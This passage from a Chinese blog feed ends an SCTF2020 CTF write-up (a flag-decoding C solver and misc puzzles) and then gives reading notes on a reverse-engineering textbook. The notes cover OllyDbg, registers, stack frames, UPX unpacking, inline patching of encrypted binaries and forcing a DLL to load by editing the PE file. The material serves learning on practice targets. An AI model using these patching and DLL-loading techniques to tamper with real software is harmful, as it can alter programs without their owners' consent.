class="number">0</span>, j = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v11 = (v11 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">v10 = (*(od + v11) + v10) % <span class="number">256</span>;</span><br><span class="line">*(od +  v11) = (*(od +  v10) &amp; ~*(od +  v11)) | (*(od +  v11) &amp; ~*(od +  v10));</span><br><span class="line">    *(od +  v10) = (*(od +  v10) &amp; ~*(od +  v11)) | (*(od +  v11) &amp; ~*(od +  v10));</span><br><span class="line">    *(od +  v11) = (*(od +  v10) &amp; ~*(od +  v11)) | (*(od +  v11) &amp; ~*(od +  v10));</span><br><span class="line">    v6 = (*(od +  v10) + *(od +  v11)) % <span class="number">256</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">    temp = j;</span><br><span class="line">    temp ^= *(od +  v6);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(temp == a[i])</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">flag[i] = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：<img src="/2020/07/10/SCTF2020/image-20200714153241364.png" alt="image-20200714153241364"></p><p>下面使用idcpython脚本执行来得到改写的区段，首先ctrl+s查看区段的首地址：<img src="/2020/07/10/SCTF2020/image-20200714161123125.png" alt="image-20200714161123125"></p><p>shift+f2输入要执行的脚本，执行：<img src="/2020/07/10/SCTF2020/image-20200714161222707.png" alt="image-20200714161222707"></p><p>得到改写的数据后，先u让数据未定义，再p转化为函数。<img src="/2020/07/10/SCTF2020/image-20200714162237927.png" alt="image-20200714162237927"></p><p><strong>总结：多猜测，对数据的敏感性，这道题开始想到是hash简单很多。</strong></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>直接挂VPN进入所给网址：<img src="/2020/07/10/SCTF2020/image-20200720211239002.png" alt="image-20200720211239002"></p><h3 id="Easymisc"><a href="#Easymisc" class="headerlink" title="Easymisc"></a>Easymisc</h3><p>附件下载后是一张图片，图片名字是倒序的且打不开。</p><p>拖进010editor发现jpg图片的尾巴格式但是倒序的，结合图片名字可以知道要将图片的信息倒序，这里注意是成对的倒序还是一个一个倒序。<img src="/2020/07/10/SCTF2020/image-20200720212540806.png" alt="image-20200720212540806"></p><p>复制出数据的十六进制格式，写python脚本倒序写入文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">s = <span class="string">'复制的图片的二进制信息‘</span></span><br><span class="line"><span class="string">s = s[::-1]</span></span><br><span class="line"><span class="string">with open('</span>flag.jpg<span class="string">', "wb") as f:</span></span><br><span class="line"><span class="string">    for i in range(0, len(s), 2):</span></span><br><span class="line"><span class="string">        n = s[i]+s[i+1]</span></span><br><span class="line"><span class="string">        ans = struct.pack('</span>B<span class="string">', int(n, 16))</span></span><br><span class="line"><span class="string">        f.write(ans)</span></span><br><span class="line"><span class="string">f.close()</span></span><br></pre></td></tr></table></figure><p>得到逆序后的文件，补齐jpg图片的文件头后打开图片：<img src="/2020/07/10/SCTF2020/image-20200720213434806.png" alt="image-20200720213434806">f</p><p>发现不对，看看图片属性：<img src="/2020/07/10/SCTF2020/image-20200720213644954.png" alt="image-20200720213644954"></p><p>最后载入010editor发现更多的信息：<img src="/2020/07/10/SCTF2020/image-20200720213808864.png" alt="image-20200720213808864"></p><p>最后找在线网站进行rc4解密：<img src="/2020/07/10/SCTF2020/image-20200720213948350.png" alt="image-20200720213948350"></p><h3 id="doudizhu"><a href="#doudizhu" class="headerlink" title="doudizhu"></a>doudizhu</h3><p>直接玩游戏通关，有游戏体验。。哈哈</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做了点杂项😪。。赛后肝了下逆向，不会的看了writeup学习学习。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>逆向工程核心原理读书笔记</title>
    <link href="https://www.bxnop.cn/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>https://www.bxnop.cn/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</id>
    <published>2020-07-01T06:13:51.000Z</published>
    <updated>2020-09-17T14:38:41.016Z</updated>
    
    <content type="html"><![CDATA[<p><strong>PS：本书将指引你进入美妙又刺激的代码逆向分析世界，开启一段神奇之旅！</strong><a id="more"></a></p><h2 id="第二章-逆向分析-Hello-World-程序"><a href="#第二章-逆向分析-Hello-World-程序" class="headerlink" title="第二章 逆向分析 Hello World!程序"></a>第二章 逆向分析 Hello World!程序</h2><h3 id="OD常用快捷键"><a href="#OD常用快捷键" class="headerlink" title="OD常用快捷键"></a>OD常用快捷键</h3><ul><li>执行到返回：ctrl+F9</li></ul><ul><li>重新开始：ctrl+F2</li></ul><ul><li>执行到光标处：F4</li></ul><ul><li>编辑数据：ctrl+E</li></ul><ul><li>编写汇编代码：空格</li></ul><ul><li>注释：；</li></ul><ul><li>设置标签：：</li></ul><h3 id="设置程序大本营"><a href="#设置程序大本营" class="headerlink" title="设置程序大本营"></a>设置程序大本营</h3><p>1.先对所要设置的语句设置一个标签，再通过查看已经设置的标签找到。同时标签可以让代码变得非常直观。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200701143813355.png" alt="image-20200701143813355"></p><p>2.与标签相同的方法，只不过使用 ；，再查看已经设置的注释。</p><p>3.设置断点。</p><p>4.使用命令跳转命令：ctrl+G</p><h3 id="快速查找指定代码"><a href="#快速查找指定代码" class="headerlink" title="快速查找指定代码"></a>快速查找指定代码</h3><p>1.API检索法（1）：在调用代码中设置断点。</p><ul><li>在事先推测出代码要使用API后，鼠标右键菜单-查找-所有模块间之间的调用。找到指定函数后双击查看。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200701144638966.png" alt="image-20200701144638966"></li></ul><p>2.API检索法（2）：在API代码中设置断点。</p><ul><li>鼠标右键菜单-查找-所有模块名称，列出被加载的DLL文件中提供的所有API。找到函数，进入下断点，F9执行，在该函数停下后，使用ctrl+F9执行到ret，最后F7回到被调用函数的下一条语句处。</li></ul><hr><h2 id="第三章-小端序标记法"><a href="#第三章-小端序标记法" class="headerlink" title="第三章 小端序标记法"></a>第三章 小端序标记法</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><ul><li><p>字节序：多字节数据在计算机内存中存储或网络传输时各字节的存储顺序。主要二大类：大端与小端。</p></li><li><p>大端：高地址存放数据的低位，低地址存放数据的高位。</p></li><li><p>小端：高地址存放数据的高位，低地址存放数据的地位。</p></li></ul><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><ul><li>大端序常用于大型UNIX服务器的RISC系列的CPU与网络传输协议中。</li><li>小端序，Intel x86 Cpu采用的序列。</li></ul><hr><h2 id="第四章-IA-32寄存器基本详解"><a href="#第四章-IA-32寄存器基本详解" class="headerlink" title="第四章 IA-32寄存器基本详解"></a>第四章 IA-32寄存器基本详解</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>寄存器：CPU内部用来存放数据的一些小型存储区域。它集成在CPU内部，拥有非常高的读写速度。</p><h3 id="基本程序运行寄存器"><a href="#基本程序运行寄存器" class="headerlink" title="基本程序运行寄存器"></a>基本程序运行寄存器</h3><p>1.通用寄存器（32位 8个）：EAX，EBX，ECX，EDX，ESI，EDI，EBP，ESP</p><p><strong>ps：为了实现对低16位寄存器的兼容，各寄存器又可分为高：H（high），低（L：low）几个独立的寄存器。</strong></p><ul><li>EAX：（0-31）32位</li><li>AX：（0-15）EAX的低16位</li><li>AH：（8-15）AX的高8位</li><li>AL：（0-7）AX的低8位</li></ul><p>EAX：（针对操作数和结果数据的）累加器</p><p>EBX：（DS段中的数据指针）基址寄存器</p><p>ECX：（字符串和循环操作的）计数器</p><p>EDX：（I/O指针）数据寄存器</p><p><strong>ps：以上4个寄存器主要用在算术运算之路中，常常用于保存常量与变量的值，EAX一般用在函数返回值中。</strong></p><p>EBP：（SS段中栈内数据指针）拓展基址指针寄存器</p><p>ESI：（字符串操作源指针）源变址寄存器</p><p>EDI：（字符串操作目标指针）目的变址寄存器</p><p>ESP：（SS段中栈指针）栈指针寄存器</p><p><strong>ps：以上四个寄存器常用作保存内存地址的指针。</strong></p><p>2.段寄存器（16位 6个）：CS，DS，SS，ES，FS，GS</p><ul><li><p>CS：代码段寄存器</p></li><li><p>SS：栈段寄存器</p></li><li><p>DS：数据段寄存器</p></li><li><p>ES：附加数据段寄存器</p></li><li><p>FS：数据段寄存器</p></li><li><p>GS：数据段寄存器</p></li></ul><p>3.程序状态与控制寄存器：ELFLAGS寄存器的每位都有意义，每位的值为0或1。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200701190155792.png" alt="image-20200701190155792"></p><p>常见的三个：</p><ul><li>ZF：若运算结果为0，则其值为1，否则为0</li><li>OF：有符号整数溢出时，OF值被置为1。此外，MSB(最高有效位)改变时，其值也被设为1</li><li>CF：无符号整数溢出时，其值被置为1</li></ul><p>4.指令指针寄存器（EIP）：保存着CPU要执行指令的地址，每执行完一条指令就会通过EIP寄存器读取下一条指令。</p><hr><h2 id="第五章-栈"><a href="#第五章-栈" class="headerlink" title="第五章 栈"></a>第五章 栈</h2><p>栈：其实是一种数据结构，它按照FILO（先进后出）的原则存储数据。用于存储局部变量，传递函数参数，保存函数的返回地址。</p><p>这里拿之前在PWN学习过程中对栈学习后的图做补充。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200609114209670-1593603250485.png" alt="image-20200609114209670"></p><hr><h2 id="第六章-分析abex’-crackme-1"><a href="#第六章-分析abex’-crackme-1" class="headerlink" title="第六章 分析abex’ crackme#1"></a>第六章 分析abex’ crackme#1</h2><ul><li>使用VC++，VC，Delphi等开发工具编写的程序，除了自己编写的代码外，还有一部分启动函数由编译器添加的。但是如果使用汇编语言编写程序，汇编代码直接变为反汇编代码，main()函数直接出现在EP中。</li><li>GetDriveType()函数：获取C驱动器的类型（大部分返回的是HDD类型）。</li><li>注意调用Win32 API后，某些特定寄存器的值就会改变。</li></ul><hr><h2 id="第七章-栈帧"><a href="#第七章-栈帧" class="headerlink" title="第七章 栈帧"></a>第七章 栈帧</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><ul><li><p>栈帧：利用EBP（栈帧指针）寄存器访问栈内的局部变量，参数，函数返回地址的手段。</p></li><li><p>函数开始时，会先通过<code>push ebp;mov ebp, esp;</code>生成与其对应的栈帧。函数结束时会通过<code>mov esp, ebp;pop ebp;（leave）</code>删除栈帧。</p></li><li><p>最新的编译器都有一个优化选项，使用该选项编译简单的函数将不会产生栈帧。</p></li></ul><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li><p>函数中局部变量使用sub esp xx；开辟空间；函数结束后，参数传递使用的栈空间使用add esp xx；进行清理。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200702190509071.png" alt="image-20200702190509071"></p></li><li><p>在栈窗口中，点击鼠标右键，选择地址后可以选择栈相对于那个寄存器的偏移来显示，可以让栈空间更直观。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200702190825336.png" alt="image-20200702190825336"></p></li><li><p>对于原来以EBP表示的函数局部变量，可以通过使用快捷键<strong>alt+o</strong>，然后选择分析1，将<strong>显示函数中的局部变量与参数</strong>的选项勾上。那我们的在OD中看到的局部变量将会被表示成：LOCAL.n，参数表示成：ARG.n。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200702191428951.png" alt="image-20200702191428951"></p></li><li><p>函数调用规则：cdecl：函数调用者（Caller）负责清理储存在栈中的参数。</p><p>​                          stdcall：被调用者（Callee）负责清理保存在栈中的参数。</p></li><li><p>XOR命令：异或运算，由于XOR命令比MOV EAX，0命令执行速度快，所以常用于寄存器初始化操作。</p></li></ul><hr><h2 id="第八章-abex’-crackme-2"><a href="#第八章-abex’-crackme-2" class="headerlink" title="第八章 abex’ crackme #2"></a>第八章 abex’ crackme #2</h2><p>第一次分析vb写的程序，开始很不适应，后面从对象出发还是好很多，但始终还是不如VC写的简单，还是自己能力不够。</p><h3 id="VB编写程序的介绍"><a href="#VB编写程序的介绍" class="headerlink" title="VB编写程序的介绍"></a>VB编写程序的介绍</h3><p>事件处理程序：VB主要用来编写GUI程序。由于VB程序采用windows操作系统的系统的事件驱动方式工作，所以在main()或WinMain()中并不存在用户代码(即我们希望调试的代码)，用户代码存在于各个事件处理程序中。</p><p>未文档化的结构体：VB中使用的各种信息以结构体形式保存在文件内部。由于微软未正式公开这种结构体信息，所以调试VB文件会难一些。</p><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>首先调用VB引擎主函数（ThunRTMain）<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704125816635.png" alt="image-20200704125816635"></p><p>这里直接从事件处理程序开始<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704141338867.png" alt="image-20200704141338867"></p><p>获取输入的name字符串<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704141442295.png" alt="image-20200704141442295"></p><p>长度比较<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704141501224.png" alt="image-20200704141501224"></p><p>使用name生成密码<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704141533793.png" alt="image-20200704141533793"></p><p>最后，比较密码<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704141550425.png" alt="image-20200704141550425"></p><p>难点：程序中处理的每个数据都是对象，调试时不易看，且程序中函数太多。</p><hr><h2 id="第九章-Process-Explorer"><a href="#第九章-Process-Explorer" class="headerlink" title="第九章 Process Explorer"></a>第九章 Process Explorer</h2><p>积累一个新工具：进程管理。</p><p>可以显示电脑中运行每个进程哦PID，CPU占有率，注册信息，终止进程。</p><hr><h2 id="第十章-函数调用约定"><a href="#第十章-函数调用约定" class="headerlink" title="第十章 函数调用约定"></a>第十章 函数调用约定</h2><p>三种主要的函数调用约定：cdecl（C语言默认调用），stdcall（使用_stdcall关键字来使用stdcall方式编译），fastcall</p><p>它们通过栈来传递参数的方式都是一样的，区别在于清理栈的过程。</p><p>cdecl：函数调用者清理压入栈的参数。在调用函数之后通过：add esp xxx;</p><p>stdcall：被调用者清理栈。如RETN 8;命令，它的含义就是：RETN+POP 8字节，返回后使esp增加指定大小。（Win 32 API 使用stdcall方式，这个方式可以获得更好的兼容性，使C语言之外的其他语言也能直接调用API）</p><p>fastcall：前2个参数会使用ECX与EDX寄存器传递参数，实现对函数的快速调用。其他与stdcall相似。</p><hr><h2 id="第十一章-视频讲座"><a href="#第十一章-视频讲座" class="headerlink" title="第十一章 视频讲座"></a>第十一章 视频讲座</h2><p>收获两点：1.查看传入一个函数的参数个数。2.neg指令与sbb指令。</p><p>1.查看传入函数参数个数：首先判断函数调用约定，再在函数调用前后查看栈情况即可。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704203210059.png" alt="image-20200704203210059"></p><p>函数调用后，两次的esp只差即为使用栈空间传递参数大小。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704203311197.png" alt="image-20200704203311197"></p><p>2.neg指令的操作对象是0则CF=0，否则CF=1<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200704203750309.png" alt="image-20200704203750309"></p><hr><h2 id="第十三章-PE文件格式"><a href="#第十三章-PE文件格式" class="headerlink" title="第十三章 PE文件格式"></a>第十三章 PE文件格式</h2><p>之前已经学习总结在另一个帖子：<strong><a href="http://www.bxnop.cn/2020/05/30/PE%E5%AD%A6%E4%B9%A0/">http://www.bxnop.cn/2020/05/30/PE%E5%AD%A6%E4%B9%A0/</a></strong></p><hr><h2 id="第十五章-调试UPX压缩的notepad程序"><a href="#第十五章-调试UPX压缩的notepad程序" class="headerlink" title="第十五章 调试UPX压缩的notepad程序"></a>第十五章 调试UPX压缩的notepad程序</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>GetModuleHandleA()函数：获取程序的imagebase。</li></ul><ul><li>GetProcAdress()函数：从EAT中获取指定名称的API的实际地址。</li></ul><ul><li>pushad命令：将8个通用寄存器（EAX-EDI）的值保存到栈；popad是将栈中的各个值再次回复到各个寄存器。</li></ul><ul><li>在内存复制命令中，ESI指Source，EDI指Destination。调试时，同时设置ESI与EDI时就应该猜想从ESI所指缓冲区到EDI所指缓冲区的内存发生复制。</li></ul><ul><li>ctrl+f11：反复执行step into，ctrl+f12：反复执行step over（都是不显示画面）</li></ul><ul><li>脱壳后修正IAT的原因：压缩后，文件INT(记录API名称，序数)已经损坏。</li></ul><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>1.从一个循环一个循环的跳出解压缩过程最后找到EP。</p><p>2.利用堆栈平衡的原理，在程序刚开始的的esp处的数据下硬件断点，F9执行，断下的地方即是解压缩完成的地方。</p><p>断点-&gt;硬件访问-&gt;字节</p><h2 id="第十六章-基址重定位表"><a href="#第十六章-基址重定位表" class="headerlink" title="第十六章 基址重定位表"></a>第十六章 基址重定位表</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>PE文件在重定位过程中用到基址重定位表。</p><p>当向进程的虚拟内存加载PE文件（EXE/DLL/SYS）时，文件会被加载到PE头的imagebase所指的地址处，若加载的是DLL(SYS)文件且在imagebase位置处已经加载了DLL(SYS)文件，那么PE装载器就会将其加载到其他未被占用的空间，这就会引起一系列重定位问题。</p><p>创建好进程，EXE文件会首先加载到内存，所以EXE文件无需考虑重定位问题，但windows vista之后的版本引入了ASLR的安全机制。</p><h3 id="基址重定位表"><a href="#基址重定位表" class="headerlink" title="基址重定位表"></a>基址重定位表</h3><p>PE头的DataDirectory[5]记录了它的RVA与SIZE。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD VirtualAdress; <span class="comment">//一个基准地址（每个块的基址不同）</span></span><br><span class="line">    DWORD SizeOfBlock; <span class="comment">//块的大小</span></span><br><span class="line">  <span class="comment">//WORD TypeOffset][1]; 在每个块结构体后出现的word型数组。</span></span><br><span class="line">  <span class="comment">//数组中每个值加上上面基址就是硬编码在程序中的地址偏移。</span></span><br><span class="line">  <span class="comment">//数组中每个值的前4位表示：类型；后12位表示：偏移</span></span><br><span class="line">&#125;IMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><p>以查看notepad程序的重定位表为例：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200705203510640.png" alt="image-20200705203510640"></p><h3 id="程序实例分析"><a href="#程序实例分析" class="headerlink" title="程序实例分析"></a>程序实例分析</h3><p>可以看到，程序中的内存地址以硬编码形式存在，如果加载的基地址不同又不进行重定位，程序将内存地址引用错误退出。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200705184742277.png" alt="image-20200705184742277"></p><blockquote><p>重定位操作的基本操作原理</p><p><strong>在应用程序中查找硬编码的地址位置</strong></p><p><strong>读取值后，减去imagebase（VA-&gt;RVA）</strong></p><p><strong>加上实际加载的地址（RVA-&gt;VA）</strong></p></blockquote><p>找到第一个硬编码位置：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200705204042726.png" alt="image-20200705204042726"></p><p>加载OD，查看指定RVA:<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200705204651976-1600246974741.png" alt="image-20200705204651976"></p><p>这里经过的过程：（1）由于imagebase为：<strong>1000000</strong>，所以开始读到的值为：<strong>10010C4</strong>，（2）减去imagebase：<strong>10010C4-1000000 = 10C4</strong>，（3）加上实际的加载基地址：<strong>10C4+F20000 = F210C4</strong></p><p>一直重复上述过程，直到TypeOffset的值为0，则表明一个结构体块结束。对所有结构体块如此，直到遇到NULL（即最后一个结构体以NULL结束）。</p><hr><h2 id="第二十章-“内嵌补丁练习”"><a href="#第二十章-“内嵌补丁练习”" class="headerlink" title="第二十章 “内嵌补丁练习”"></a>第二十章 “内嵌补丁练习”</h2><h3 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h3><p>内嵌补丁：内嵌代码补丁的简称，对难以修改指定代码时，在程序中插入并运行被称为“洞穴代码”的补丁代码后对程序打补丁的技术。</p><h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>首先单步调式，很快来到2处解密代码的地方，记录好解密代码区域：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706201923481.png" alt="image-20200706201923481"></p><p>继续单步：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706202406843.png" alt="image-20200706202406843"></p><p>继续：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706202743840.png" alt="image-20200706202743840"></p><blockquote><p>EDX寄存器为4个字节大小，像这样向其中不断加上4个字节的值，就会发生溢出。一般的校验和计算中常常忽略该溢出问题，使用最后一个保存在EDX中的值。</p></blockquote><p>继续单步步入：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706203316068.png" alt="image-20200706203316068"></p><p>最后解密完成，来到OEP：40121E<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706203545470.png" alt="image-20200706203545470"></p><blockquote><p>打内嵌补丁操作：找到写入补丁代码的区域：（1）设置到文件空白区域。（2）扩展最后的节区后设置。（3）添加新节区后设置。</p></blockquote><p>这里直接找空白区域：在.txt节区的：401280开始写入代码：<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706205802855.png" alt="image-20200706205802855"></p><p>最后在之前的jmp oep的地方，把oep修改为我们的内嵌补丁。但是注意：jmp oep指令也是加密了的，所以我们要写入异或过的数据。且这里要写入文件中才可以，不能是内存中。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200706210952163.png" alt="image-20200706210952163"></p><p>最后，打开文件成功。</p><hr><h2 id="第二十五章-通过修改PE加载DLL"><a href="#第二十五章-通过修改PE加载DLL" class="headerlink" title="第二十五章 通过修改PE加载DLL"></a>第二十五章 通过修改PE加载DLL</h2><h3 id="介绍-5"><a href="#介绍-5" class="headerlink" title="介绍"></a>介绍</h3><p>通过“直接修改目标文件的可执行文件”，使其运行时强制加载指定的DLL文件。每当进程开始运行时就会自动加载指定的DLL文件，而<strong>加载了某DLL文件会自动执行其DLLMain。</strong></p><p>本技术关键就是对PE文件头的修改，把之前学习了PE知识应用起来（特别是IMAGE_IMPORT_DESCRIPTOP）。</p><h3 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h3><p>对于要强制加载dll文件源代码就是下载一个网页的功能，本技术的关键不在这里，所以我只将我查过其中的一些函数记录下来：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">GetModuleFileName</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HMODULE hModule,   <span class="comment">//应用程序或DLL实例句柄,NULL则为获取当前程序可执行文件路径名</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPTSTR lpFilename, <span class="comment">//接收路径的字符串缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD nSize        <span 